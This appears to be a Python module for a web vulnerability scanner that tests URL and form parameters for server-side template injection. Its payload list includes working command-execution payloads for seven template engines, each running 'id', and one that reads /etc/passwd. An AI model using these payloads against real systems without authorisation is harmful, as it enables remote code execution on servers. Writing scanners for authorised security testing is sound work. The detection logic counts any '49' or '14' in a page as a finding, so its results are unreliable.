"""
Server-Side Template Injection (SSTI) Scanner - Detects SSTI vulnerabilities
"""

import logging
import requests
import re
import random
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Any, Optional
from core.config.config_manager import ConfigManager
from core.reporting.report_generator import Finding, Severity
from core.utils.logger import get_security_logger

logger = logging.getLogger(__name__)
security_logger = get_security_logger()

class SSTIScanner:
    """Server-Side Template Injection vulnerability scanner."""

    def __init__(self, config_manager: ConfigManager):
        """
        Initialize the SSTI scanner.

        Args:
            config_manager: Configuration manager instance
        """
        self.config = config_manager.get_scanner_config('ssti')
        self.general_config = config_manager.get('general')

        # Template engine specific payloads
        self.payloads = {
            # Jinja2 (Python/Flask)
            'jinja2': [
                '{{7*7}}',
                '{{config.items()}}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '{{lipsum.__globals__["os"].popen("id").read()}}',
                '{{url_for.__globals__["sys"].modules["os"].popen("id").read()}}',
            ],
            
            # Twig (PHP/Symfony)
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{app.request.server.get("DOCUMENT_ROOT")}}',
                '{{"#{`id`}"}}',
            ],
            
            # Smarty (PHP)
            'smarty': [
                '{7*7}',
                '{php}echo `id`;{/php}',
                '{system("id")}',
                '{$smarty.version}',
            ],
            
            # Freemarker (Java)
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join("")}',
            ],
            
            # Velocity (Java)
            'velocity': [
                '#set($x=7*7)$x',
                '#set($runtime=$Class.forName("java.lang.Runtime").getRuntime())#set($process=$runtime.exec("id"))$process.waitFor()#set($input=$process.getInputStream())#set($stringbuilder=$Class.forName("java.lang.StringBuilder").newInstance())#set($scanner=$Class.forName("java.util.Scanner").newInstance($input).useDelimiter("\\A"))#if($scanner.hasNext())#set($string=$scanner.next())$string#end',
            ],
            
            # Handlebars (JavaScript)
            'handlebars': [
                '{{7*7}}',
                '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
            ],
            
            # Mako (Python)
            'mako': [
                '${7*7}',
                '<%import os%>${os.system("id")}',
                '${__import__("os").system("id")}',
            ],
        }

        # Simple math expressions for basic detection
        self.basic_payloads = [
            '${7*7}',
            '{{7*7}}', 
            '{7*7}',
            '#{7*7}',
            '%{7*7}',
            '${7+7}',
            '{{7+7}}',
            '{7+7}',
        ]

    def scan(self, target_url: str) -> List[Finding]:
        """
        Scan for SSTI vulnerabilities.

        Args:
            target_url: URL to scan

        Returns:
            List of findings
        """
        logger.info(f"Starting SSTI scan on {target_url}")
        findings = []

        try:
            # Test GET parameters
            findings.extend(self._test_get_parameters(target_url))
            
            # Test POST parameters  
            findings.extend(self._test_post_parameters(target_url))
            
            # Test template-specific payloads
            findings.extend(self._test_template_engines(target_url))

        except Exception as e:
            logger.error(f"Error during SSTI scan: {str(e)}")
            security_logger.log_error("SSTI_SCAN_ERROR", str(e), target_url)

        logger.info(f"SSTI scan completed - {len(findings)} findings")
        return findings

    def _test_get_parameters(self, target_url: str) -> List[Finding]:
        """Test GET parameters for SSTI."""
        findings = []
        
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            # Add a test parameter if none exist
            query_params = {'param': ['test']}
        
        for param_name in query_params:
            findings.extend(self._test_parameter_ssti(target_url, param_name, 'GET'))
            if findings:  # Found vulnerability, no need to test more parameters
                break

        return findings

    def _test_post_parameters(self, target_url: str) -> List[Finding]:
        """Test POST parameters for SSTI."""
        findings = []
        
        # Common form field names to test
        common_fields = ['name', 'message', 'content', 'comment', 'text', 'subject', 'body']
        
        for field_name in common_fields:
            findings.extend(self._test_parameter_ssti(target_url, field_name, 'POST'))
            if findings:  # Found vulnerability, no need to test more
                break

        return findings

    def _test_parameter_ssti(self, target_url: str, param_name: str, method: str) -> List[Finding]:
        """Test specific parameter for SSTI."""
        findings = []
        
        # First try basic math expressions
        for payload in self.basic_payloads:
            try:
                response = self._send_payload(target_url, param_name, payload, method)
                
                if response and self._detect_ssti_math(response, payload):
                    # Confirmed SSTI, now identify template engine
                    template_engine = self._identify_template_engine(target_url, param_name, method)
                    
                    finding = Finding(
                        title="Server-Side Template Injection (SSTI)",
                        severity=Severity.HIGH,
                        confidence=0.9,
                        description=f"SSTI vulnerability detected in {method} parameter '{param_name}'" + 
                                  (f" using {template_engine} template engine" if template_engine else ""),
                        url=target_url,
                        method=method,
                        parameter=param_name,
                        payload=payload,
                        evidence=self._extract_ssti_evidence(response, payload),
                        impact="SSTI can lead to remote code execution, allowing attackers to execute arbitrary commands on the server.",
                        remediation="Use safe templating practices, sanitize user input, and consider sandboxed template engines."
                    )
                    findings.append(finding)
                    logger.warning(f"SSTI vulnerability found in {param_name} with payload: {payload}")
                    break
                    
            except requests.RequestException as e:
                logger.debug(f"Error testing SSTI in {param_name}: {str(e)}")

        return findings

    def _test_template_engines(self, target_url: str) -> List[Finding]:
        """Test for specific template engine vulnerabilities."""
        findings = []
        
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return findings
        
        param_name = list(query_params.keys())[0]  # Test first parameter
        
        for engine_name, engine_payloads in self.payloads.items():
            for payload in engine_payloads[:2]:  # Test first 2 payloads per engine
                try:
                    response = self._send_payload(target_url, param_name, payload, 'GET')
                    
                    if response and self._analyze_template_response(response, payload, engine_name):
                        finding = Finding(
                            title=f"SSTI via {engine_name.title()} Template Engine",
                            severity=Severity.HIGH,
                            confidence=0.8,
                            description=f"Server-Side Template Injection detected using {engine_name} template engine",
                            url=target_url,
                            method="GET",
                            parameter=param_name,
                            payload=payload,
                            evidence=self._extract_template_evidence(response, payload, engine_name),
                            impact=f"SSTI in {engine_name} can lead to remote code execution and server compromise.",
                            remediation=f"Sanitize user input before passing to {engine_name} templates. Use sandboxed execution if possible."
                        )
                        findings.append(finding)
                        logger.warning(f"SSTI found using {engine_name} engine")
                        return findings  # Found one, return immediately
                        
                except requests.RequestException as e:
                    logger.debug(f"Error testing {engine_name} SSTI: {str(e)}")

        return findings

    def _send_payload(self, target_url: str, param_name: str, payload: str, method: str) -> Optional[requests.Response]:
        """Send SSTI payload."""
        try:
            if method == 'GET':
                parsed_url = urlparse(target_url)
                query_params = parse_qs(parsed_url.query)
                query_params[param_name] = [payload]
                
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                response = requests.get(
                    test_url,
                    params=query_params,
                    timeout=self.general_config.get('timeout', 30),
                    headers={'User-Agent': self.general_config.get('user_agent')}
                )
            else:  # POST
                data = {param_name: payload}
                response = requests.post(
                    target_url,
                    data=data,
                    timeout=self.general_config.get('timeout', 30),
                    headers={'User-Agent': self.general_config.get('user_agent')}
                )
            
            return response

        except requests.RequestException as e:
            logger.debug(f"Request failed for SSTI payload '{payload}': {str(e)}")
            return None

    def _detect_ssti_math(self, response: requests.Response, payload: str) -> bool:
        """Detect SSTI by looking for evaluated math expressions."""
        content = response.text
        
        # Check for evaluated math expressions
        if '7*7' in payload or '7+7' in payload:
            if '49' in content:  # 7*7 = 49
                return True
            if '14' in content:  # 7+7 = 14  
                return True
        
        return False

    def _identify_template_engine(self, target_url: str, param_name: str, method: str) -> Optional[str]:
        """Try to identify the specific template engine."""
        # Test engine-specific syntax
        test_payloads = [
            ('jinja2', '{{config}}'),
            ('twig', '{{app}}'),
            ('smarty', '{$smarty}'),
            ('freemarker', '${.version}'),
            ('velocity', '$Class'),
            ('handlebars', '{{this}}'),
            ('mako', '<%doc%>test</%doc>'),
        ]
        
        for engine, test_payload in test_payloads:
            try:
                response = self._send_payload(target_url, param_name, test_payload, method)
                
                if response:
                    content = response.text.lower()
                    
                    # Look for engine-specific indicators
                    if engine == 'jinja2' and ('flask' in content or 'jinja' in content):
                        return engine
                    elif engine == 'twig' and ('symfony' in content or 'twig' in content):
                        return engine
                    elif engine == 'smarty' and 'smarty' in content:
                        return engine
                    elif engine == 'freemarker' and ('freemarker' in content or 'version' in content):
                        return engine
                    elif engine == 'velocity' and ('velocity' in content or 'class' in content):
                        return engine
                    
            except requests.RequestException:
                continue
        
        return None

    def _analyze_template_response(self, response: requests.Response, payload: str, engine: str) -> bool:
        """Analyze response for template engine specific indicators."""
        content = response.text
        
        # Check for math evaluation
        if self._detect_ssti_math(response, payload):
            return True
        
        # Check for engine-specific output
        if engine == 'jinja2':
            if 'flask' in content.lower() or 'werkzeug' in content.lower():
                return True
            if 'config' in payload.lower() and len(content) > len(payload) * 2:
                return True
        
        elif engine == 'twig':
            if 'symfony' in content.lower() or 'twig' in content.lower():
                return True
            if 'app.request' in payload and 'server' in content.lower():
                return True
        
        elif engine == 'smarty':
            if 'smarty' in content.lower():
                return True
        
        elif engine == 'freemarker':
            if 'freemarker' in content.lower():
                return True
        
        # Look for command execution output
        command_indicators = ['uid=', 'gid=', 'groups=', 'root:']
        if any(indicator in content for indicator in command_indicators):
            return True
        
        return False

    def _extract_ssti_evidence(self, response: requests.Response, payload: str) -> str:
        """Extract evidence of SSTI."""
        evidence = [f"Payload: {payload}"]
        
        content = response.text
        
        if '49' in content:
            evidence.append("Math expression 7*7 evaluated to 49")
        elif '14' in content:
            evidence.append("Math expression 7+7 evaluated to 14")
        
        evidence.append(f"Status Code: {response.status_code}")
        
        # Look for specific template indicators
        if 'config' in content.lower():
            evidence.append("Template configuration exposed")
        
        return "; ".join(evidence)

    def _extract_template_evidence(self, response: requests.Response, payload: str, engine: str) -> str:
        """Extract evidence for specific template engine."""
        evidence = [f"Template Engine: {engine}"]
        evidence.append(f"Payload: {payload}")
        
        content = response.text
        
        # Look for command execution
        if any(indicator in content for indicator in ['uid=', 'gid=', 'root:']):
            evidence.append("Command execution detected")
        
        # Look for template-specific indicators
        if engine in content.lower():
            evidence.append(f"Template engine '{engine}' detected in response")
        
        evidence.append(f"Status Code: {response.status_code}")
        
        return "; ".join(evidence)